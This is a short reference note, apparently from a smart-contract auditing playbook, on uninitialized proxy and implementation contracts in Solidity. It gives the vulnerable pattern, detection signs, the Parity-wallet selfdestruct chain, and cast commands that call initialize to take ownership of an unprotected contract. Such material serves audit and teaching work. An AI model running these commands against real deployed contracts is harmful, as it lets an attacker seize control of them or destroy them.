# Uninitialized proxy / implementation — call init before anyone does

## The shape

```solidity
contract Impl {
    address public owner;
    bool initialized;
    function initialize(address _o) external {
        require(!initialized);
        owner = _o; initialized = true;
    }
}
// deployed BEHIND a proxy — the proxy holds state, the impl is uninitialized
```

A proxy pattern stores state in the PROXY but runs IMPL code. The impl's own
`initialize` is often left callable on the impl contract itself (or callable a
second time on the proxy if the `initialized` flag lives in the wrong context).
Whoever calls `initialize` first becomes the owner.

## The detection fingerprint

- an `initialize`/`init`/`setup` function, an `initializer`-style guard
- a proxy pattern (`fallback` → `delegatecall`, an `impl`/`logic` var)
- `initialized`/`_initialized` flag the init sets
- the impl deployed and uninitialized on-chain
- **falsifier**: init already called and `initialized` true in the relevant
  context, or the impl's init is `onlyDeployer`-protected

## The exploit

```bash
# the impl contract's own initialize is callable
cast call $IMPL "initialized()(bool)" --rpc-url $RPC     # false → callable
cast send $IMPL "initialize(address)" $CALLER --private-key $KEY --rpc-url $RPC
cast call $IMPL "owner()(address)" --rpc-url $RPC        # = caller
```

## The two contexts

- **impl's init** — the impl contract itself was deployed and never init'd;
  calling `initialize` on the impl owns the impl (usually harmless — but if the
  impl holds the predicate's state or can selfdestruct, that's the bug)
- **proxy re-init** — the proxy's `initialized` flag and the impl's are in
  DIFFERENT storage; calling `initialize` through the proxy re-runs it on the
  proxy's storage → take the proxy's ownership

## The chain shape

`delegatecall` + uninitialized init is the parity-wallet kill: call `initWallet`
on the library (become its owner in the calling context), then `kill` — the
`selfdestruct` runs on the calling contract's storage. See `delegatecall.md` +
`selfdestruct.md`.

## The evidence

`cast call` the `owner()`/`initialized()` after the init tx — the caller is
owner. If the predicate is a contract-destroyed check, the `selfdestruct`
receipt + the code-size read (`cast code` returns `0x`) prove it.
